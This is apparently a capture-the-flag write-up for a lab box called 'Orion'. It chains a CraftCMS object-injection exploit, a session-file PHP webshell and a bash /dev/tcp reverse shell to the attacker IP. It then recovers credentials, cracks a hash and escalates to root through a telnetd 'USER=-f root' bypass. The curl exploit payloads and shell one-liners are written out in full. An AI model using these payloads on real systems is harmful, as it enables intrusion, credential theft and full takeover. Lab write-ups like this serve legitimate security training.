# HTB: Orion

**Difficulty:** Easy
**OS:** Linux
**Target:** orion.htb
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning

A standard Nmap service scan against the target turned up two open ports.

```
nmap -sCV orion.htb
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
```

Nginx was configured to redirect to the vhost `orion.htb`, which doesn't resolve without a manual hosts entry, so I added it before doing anything else:

```
echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts
```

### Site Fingerprinting

Browsing to `http://orion.htb/` showed a simple telecom company landing page. Nothing interesting was linked from the nav, but the footer gave the game away immediately:

```
Powered by CraftCMS
```

Rather than guess at endpoints, I fuzzed the site for anything not linked from the UI:

```
ffuf -u http://orion.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic
```

```
assets    [Status: 301, Size: 178]
admin     [Status: 302, Size: 0]
```

`/admin` redirects to `/admin/login`, which turned out to be the single most useful page on the entire site — because some developer had left the CraftCMS version number visible in the page footer:

```
Craft CMS 5.6.16
```

A quick search confirmed 5.6.16 is vulnerable to **CVE-2025-32432**, an unauthenticated remote code execution bug in the image-transform endpoint.

---

## 2. Understanding the Vulnerability

`CVE-2025-32432` lives in `actions/assets/generate-transform`. Craft (built on the Yii2 framework) processes the `handle` parameter of a transform request through Yii's **object configuration** system: any array containing a `class` key is treated as an instruction to *build that object*. The bug is that a second, attacker-controlled key — `__class` — is also honoured, and it silently overrides which class Yii actually instantiates. In other words, I could tell Craft "build a normal image-transform behavior object," but really smuggle in instructions to build a totally unrelated class of my choosing, one that's already loaded in memory server-side.

Two classes make this exploitable end to end:

- `GuzzleHttp\Psr7\FnStream` — its destructor calls a stored PHP callback (`_fn_close`), which is enough to prove code execution (e.g. calling `phpinfo`).
- `yii\rbac\PhpManager` — its constructor `include()`s a configured file path (`itemFile`) as PHP. If I can get *my own* PHP into a file on disk first, pointing this class at that file executes it.

That second point is the whole exploit chain: plant PHP somewhere writable and predictable, then abuse `PhpManager` to `include()` it.

---

## 3. Getting Valid CSRF Tokens

Every request to the vulnerable endpoint has to pass CSRF validation first. Craft/Yii ties CSRF validation to three values that must all come from the *same* session:

| Value | Source |
|---|---|
| `CraftSessionId` | `Set-Cookie` on any Craft response |
| `CRAFT_CSRF_TOKEN` (cookie) | `Set-Cookie`, alongside the session cookie |
| `X-CSRF-Token` (header) | `csrfTokenValue`, embedded in the page's inline JS |

I requested `/admin/login` with no prior cookies attached, to guarantee a clean set:

```
curl -v -g 'http://orion.htb/admin/login' -o login_body.html
```

```
< Set-Cookie: CraftSessionId=p3v0o8m1941ps85eh52ip2o8dc; path=/; HttpOnly
< Set-Cookie: CRAFT_CSRF_TOKEN=d7bae1037e5852bb...%3B%7D; path=/; HttpOnly
```

```
grep -o 'csrfTokenValue[^,]*' login_body.html
```

> **Gotcha:** all three values have to originate from the exact same exchange. If the box respawns mid-engagement (new IP, fresh instance), every previously captured value becomes worthless — Craft happily accepts any `CraftSessionId` you hand it and just creates an empty session for it, so reusing an old one doesn't error out, it just silently fails later in the chain with no useful clue as to why.

---

## 4. Confirming the Vulnerability

Before trying to get a shell, I proved the object-injection primitive actually worked, by forcing Craft to build an `FnStream` object whose destructor calls `phpinfo()`:

```
curl -s -X POST "http://orion.htb/index.php?p=actions/assets/generate-transform" \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: <csrfTokenValue>" \
  -b "CraftSessionId=<session>; CRAFT_CSRF_TOKEN=<csrf_cookie>" \
  -d '{
    "assetId": 1,
    "handle": {
        "width": 123,
        "height": 123,
        "as session": {
            "class": "craft\\behaviors\\FieldLayoutBehavior",
            "__class": "GuzzleHttp\\Psr7\\FnStream",
            "__construct()": [[]],
            "_fn_close": "phpinfo"
        }
    }
}' | grep -o "PHP Version [0-9.]*"
```

```
PHP Version 8.2.30
```

The full phpinfo dump also confirmed two facts I'd need for the next stage:

- `session.save_path` → `/var/lib/php/sessions`
- `session.name` → `CraftSessionId`

So any session file is at a fully predictable path: `/var/lib/php/sessions/sess_<CraftSessionId>`.

---

## 5. Building the Webshell — a Two-Stage Chain

### 5.1 Planting PHP Inside a Session File

Craft's login-required filter records the originally-requested URL into `$_SESSION['...__returnUrl']` whenever an unauthenticated request hits an admin-gated route and gets redirected to `/admin/login`. I abused this by embedding a PHP webshell tag inside the query string of exactly that kind of request:

```
curl -v -g -D - 'http://orion.htb/index.php?p=admin/dashboard&a=<?=eval($_GET["cmd"]);die()?>' -o /dev/null
```

```
< HTTP/1.1 302 Found
< Set-Cookie: CraftSessionId=i2p3fdf46f06frjc86n4d41b4i; path=/; HttpOnly
< Location: http://orion.htb/admin/login
```

Two things mattered a lot here, both of which cost real time to figure out:

1. **Don't supply your own `CraftSessionId`.** Let Craft mint one as a side effect of the real login-redirect flow — that's what actually populates `returnUrl` in the session. A forged/reused session ID skips this code path entirely and leaves the resulting session file empty of anything useful.
2. **Pass `-g` (`--globoff`) to curl on every request in this chain.** Curl's default URL parser treats `[` and `]` as range/glob syntax. Since PHP array-index payloads (`$_GET["cmd"]`, `system("id")`, etc.) get combined into these URLs, curl would otherwise silently mangle them — errors like `curl: (3) bad range specification in URL position ...` were the eventual giveaway.

This request writes the literal string `<?=eval($_GET["cmd"]);die()?>` into `/var/lib/php/sessions/sess_i2p3fdf46f06frjc86n4d41b4i` as part of the serialized `returnUrl` value.

### 5.2 Getting CSRF Tokens Tied to This Exact Session

```
curl -v -g 'http://orion.htb/admin/login' \
  -b "CraftSessionId=i2p3fdf46f06frjc86n4d41b4i" \
  -o login_body.html
```

```
< Set-Cookie: CRAFT_CSRF_TOKEN=c679e831bab8822e...%3B%7D; path=/; HttpOnly
```

```
grep -o 'csrfTokenValue[^,]*' login_body.html
```

### 5.3 Triggering the Webshell via `PhpManager`

`yii\rbac\PhpManager`'s constructor `include()`s its configured `itemFile` as PHP config. Pointing that at the poisoned session file makes PHP parse and execute the planted `<?=eval(...)?>` tag:

```
curl -s -g -X POST "http://orion.htb/index.php?p=actions/assets/generate-transform&cmd=system%28%22id%22%29%3B" \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: <new_csrfTokenValue>" \
  -b "CraftSessionId=i2p3fdf46f06frjc86n4d41b4i; CRAFT_CSRF_TOKEN=<new_csrf_cookie>" \
  -d '{
    "assetId": 1,
    "handle": {
        "width": 123,
        "height": 123,
        "as session": {
            "class": "craft\\behaviors\\FieldLayoutBehavior",
            "__class": "yii\\rbac\\PhpManager",
            "__construct()": [
                {"itemFile": "/var/lib/php/sessions/sess_i2p3fdf46f06frjc86n4d41b4i"}
            ]
        }
    }
}'
```

```
...5617f36303fcfa172f5dd991a7022285__returnUrl|s:76:"http://orion.htb/index.php?p=admin/dashboard&a=uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Buried in the raw session-serialization text was exactly what I was after:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Command execution confirmed as `www-data`.**

---

## 6. Getting a Reverse Shell

```
nc -lvnp 4444
```

Re-sent the same trigger request, this time with `cmd` swapped for a URL-encoded bash reverse shell one-liner:

```
curl -s -g -X POST "http://orion.htb/index.php?p=actions/assets/generate-transform&cmd=system%28%27bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.10.15.146/4444+0%3E%261%22%27%29%3B" \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: <new_csrfTokenValue>" \
  -b "CraftSessionId=i2p3fdf46f06frjc86n4d41b4i; CRAFT_CSRF_TOKEN=<new_csrf_cookie>" \
  -d '{
    "assetId": 1,
    "handle": {
        "width": 123,
        "height": 123,
        "as session": {
            "class": "craft\\behaviors\\FieldLayoutBehavior",
            "__class": "yii\\rbac\\PhpManager",
            "__construct()": [
                {"itemFile": "/var/lib/php/sessions/sess_i2p3fdf46f06frjc86n4d41b4i"}
            ]
        }
    }
}'
```

```
listening on [any] 4444 ...
connect to [10.10.15.146] from (UNKNOWN) [10.129.244.146] 51896
bash: cannot set terminal process group (962): Inappropriate ioctl for device
bash: no job control in this shell
www-data@orion:~/html/craft/web$
```

✅ **Foothold obtained as `www-data`.**

---

## 7. Local Enumeration — Finding Adam's Credentials

### 7.1 Plaintext DB Password in PHP Error Logs

Craft's own error log conveniently dumped its full runtime `$_SERVER` array, including its database configuration, straight to disk:

```
www-data@orion:~/html/craft/storage/logs$ cat phperrors.log
```

```
'CRAFT_DB_DRIVER' => 'mysql',
'CRAFT_DB_SERVER' => '127.0.0.1',
'CRAFT_DB_DATABASE' => 'orion',
'CRAFT_DB_USER' => 'root',
'CRAFT_DB_PASSWORD' => 'SuperSecureCraft123Pass!',
```

The site's `.env` file in `~/html/craft` holds the exact same values and would have worked just as well — but the error log made it a one-command find.

### 7.2 Dumping the Users Table

```
mysql -u root -p orion
```

```sql
show tables;
```

```
+----------------------------+
| Tables_in_orion            |
+----------------------------+
| ...                        |
| users                      |
| ...                        |
+----------------------------+
66 rows in set
```

```sql
SELECT username, email, password FROM users;
```

```
+----------+----------------+--------------------------------------------------------------+
| username | email          | password                                                      |
+----------+----------------+--------------------------------------------------------------+
| admin    | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS |
+----------+----------------+--------------------------------------------------------------+
```

A bcrypt hash (`$2y$...`) tied to `adam@orion.htb` — my next step was to try and crack it, since bcrypt with a low cost factor and a weak underlying password is still very much crackable offline.

### 7.3 Cracking the Hash

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```
darkangel        (?)
1g 0:00:02:51 DONE
```

`darkangel` cracked in under three minutes against rockyou — a weak, dictionary-guessable password sitting behind the site's actual admin account.

### 7.4 Password Reuse → SSH

CraftCMS credentials being reused for a system account is a very common finding, so I tried it directly:

```
ssh adam@orion.htb
```

```
adam@orion.htb's password: darkangel
...
adam@orion:~$
```

✅ **User shell obtained as `adam`, password reuse confirmed.**

---

## 8. Privilege Escalation

### 8.1 Finding a Locally-Bound Telnet Service

With a proper shell as `adam`, I checked for anything listening only on loopback that hadn't shown up in the original external Nmap scan — internal-only services are a classic place for weaker security assumptions to slip in:

```
adam@orion:/tmp$ netstat -tulnp
```

```
tcp   0   0 127.0.0.1:23      0.0.0.0:*   LISTEN   -
tcp   0   0 127.0.0.53:53     0.0.0.0:*   LISTEN   -
tcp   0   0 0.0.0.0:22        0.0.0.0:*   LISTEN   -
tcp   0   0 0.0.0.0:80        0.0.0.0:*   LISTEN   -
tcp   0   0 127.0.0.1:3306    0.0.0.0:*   LISTEN   -
```

Port 23 — telnet — bound only to `127.0.0.1`, meaning it's reachable from the box itself but was invisible externally.

### 8.2 Fingerprinting the Telnet Daemon

```
adam@orion:/tmp$ telnet --version
```

```
telnet (GNU inetutils) 2.7
```

GNU inetutils 2.7 telnet is vulnerable to **CVE-2026-24061**, a CVSS 9.8 authentication bypass. The underlying flaw is in how `telnetd` handles the client-supplied `USER` environment variable during option negotiation: rather than treating it purely as a username to pre-fill, the value gets passed straight through to `login(1)`. Supplying `-f root` as the `USER` value causes `login` to parse that as two separate arguments — the `-f` flag, which tells `login` to skip password authentication entirely for the named account, and `root` as the target account. The daemon effectively runs `login -f root` on our behalf, with zero credentials required.

### 8.3 Exploiting It

```
adam@orion:/tmp$ USER="-f root" telnet -a 127.0.0.1
```

```
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Linux 5.15.0-177-generic (orion) (pts/0)
...
root@orion:~# whoami
root
```

✅ **Full root compromise of Orion.**

---

## 9. Summary

| Stage | Technique |
|---|---|
| Recon | `nmap` + `ffuf` → CraftCMS 5.6.16 identified via footer version disclosure on `/admin/login` |
| Web foothold | Exploited **CVE-2025-32432** — Yii object-injection in `actions/assets/generate-transform` — to build attacker-chosen classes (`FnStream`, `PhpManager`) instead of the intended transform config |
| Webshell delivery | Abused Craft's login-redirect `returnUrl` session field to plant a PHP webshell inside a PHP session file on disk, then triggered execution by pointing `yii\rbac\PhpManager`'s `itemFile` config at that file |
| Reverse shell | Reused the same RCE primitive with a `bash -i >& /dev/tcp/...` payload → shell as `www-data` |
| Credential recovery | Found plaintext MySQL root credentials in `phperrors.log`; dumped the `users` table for `adam`'s bcrypt password hash |
| Password cracking | Cracked the hash with `john` + `rockyou.txt` → `darkangel` |
| Lateral movement | Password reuse — same credential worked over SSH as system user `adam` |
| Privilege escalation | Found `telnetd` (GNU inetutils 2.7) bound to localhost only; exploited **CVE-2026-24061** by setting `USER="-f root"`, causing the daemon to run `login -f root` with no authentication → `root` |

**Root cause / lessons learned:**

- Leaving the CMS version number visible anywhere on an unauthenticated page (even just a login footer) hands an attacker a direct CVE lookup with zero enumeration effort.
- Object-injection bugs like CVE-2025-32432 exist because user-supplied configuration arrays are trusted to specify *which class gets built*, not just *what properties it gets*. Any framework that lets request data influence dependency-injection class resolution needs to allowlist acceptable classes, not just validate the resulting object's properties.
- Writing user-influenced data (`returnUrl`) into a predictable, PHP-parseable location (a PHP session file, under a PHP-interpreted webroot's session save path) turns an otherwise-inert "just some stored text" feature into a webshell-planting primitive the moment any other code path can be coerced into `include()`-ing that file.
- Storing plaintext database credentials in application error logs is a serious secondary exposure — `phperrors.log` handed over the same secrets that `.env` was presumably meant to protect from casual disclosure.
- Password reuse between a web application's admin account and a real system account turned one cracked bcrypt hash into full SSH access.
- An 8-year-past-EOL-style vulnerability class (trusting a client-supplied `USER` environment variable during telnet negotiation) shows why *any* legacy network service — even one deliberately bound to localhost "for internal use only" — still needs patching. Local-only exposure just narrows the attacker population; it doesn't remove the vulnerability.

---

## 10. Tools Used

- `nmap` — initial port/service scanning
- `ffuf` — content discovery against the web root
- `curl` (with `-g`/`--globoff`) — crafting every stage of the manual CVE-2025-32432 exploit chain by hand
- CraftCMS/Yii2 object-injection payloads (`FnStream`, `yii\rbac\PhpManager`) — RCE primitive
- `nc` — catching the reverse shell
- `mysql` client — dumping the `users` table via recovered DB credentials
- `john` (rockyou.txt) — cracking the recovered bcrypt hash
- `ssh` — lateral movement via password reuse
- GNU inetutils `telnet` client, exploiting **CVE-2026-24061** — final privilege escalation to root
